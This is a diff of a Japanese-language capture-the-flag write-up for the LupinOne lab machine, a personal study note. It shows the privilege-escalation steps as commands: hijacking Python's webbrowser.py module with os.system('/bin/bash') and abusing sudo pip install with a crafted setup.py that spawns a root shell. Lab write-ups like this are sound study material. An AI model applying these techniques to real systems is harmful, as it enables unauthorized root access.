@@ -1,5 +1,6 @@
 ## LupinOne
 
+
 ### ポートスキャンまで同じ
 - 22,80
 
@@ -65,13 +66,16 @@
 ### システム内の調査
 - `sudo -l`
   - `(arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py`
-- arseneは　パスワードなしで/home/arsene/heist.pyファイルが実行できることがわかる
+- icex64はパスワードなしでarseneとして/home/arsene/heist.pyファイルが実行できることがわかる。つまり実行することで、arseneになることができる
 - heist.pyの中身を見る、これが何をしているか？
+- Permissionから何がわかる？
 - 本来なら、このpyファイルに書き込みたいが、できないのでwebbrowser関数の中に書き込む
 
 ### 攻撃アプローチ
 - webbrowserがどこにあるか調べる
   - `locate webbrowser`
+  - または
+  - `find / -name webbrowser* 2> /dev/null`
 - webbrowserファイルを開く
   -  `nano /usr/lib/python3.9/webbrowser.py`
   -  import osの下に`os.system("/bin/bash")`を書き込む
@@ -79,25 +83,24 @@
 
 ### 別ユーザで権限取得
 - `sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py`
+  - `-u`sudoをユーザを指定して実行する 
 - arseneが使えるルートコマンドを調べる
   - `sudo -l` 
 - pipコマンドが使える。GTFOBinsのSudoの部分を参考にする。pipはPythonのモジュールをインストールできるコマンド。なので、架空のモジュールを作ってpipを利用する
-- 一時的なディレクトリを作って、そこにルートコマンドになれるpythonのセットファイルを作る
+- 一時的なディレクトリを作って、そこにルートコマンドになれるpythonのセットファイルを作る。変数の設定時にはスペースを空けてはダメ
   - `cd /tmp`
-  - `TF = $(mktemp -d)`
+  - `TF=$(mktemp -d)`
   - `echo $TF`
   - `echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh < $(tty) > $(tty) 2> $(tty)')" > $TF/setup.py`
+    - os.execl('/bin ~ $(tty)') これをシングルクォーテーションひとつで書くとエラーになる。なぜかはわからん 
   - `ls $TF`
   - `sudo pip install $TF`
+
 ### ルートフラグの取得
 - ルートシェルを奪取できた
 - `cd /root`
 - `cat root.txt`
 
-## ファイルのインポート
-- Lupinを落とすと、3つのファイルがある。vmdk拡張子はvmwareというvirtualBoxとは異なる仮想環境なので、いつもと異なる方法でインポートする
-- メニューのファイルから`仮想アプライアンスのインポート`を選ぶ、ファイルのところに`Empire_LupinOne.ovf`を指定して次へボタンを押す
-  - `.ovf`ファイルは設定ファイル  
-- 仮想マシン名に名前をつける、仮想ディスクイメージに`Empire_LupinOne-disk1.vmdk`ファイルが確認して、Macアドレスのポリシーで`すべてのネットワークアダプタのMACアドレスを含む`を確認してインポートする
-- ネットワークをホストオンリーアダプタにする
+
+
 
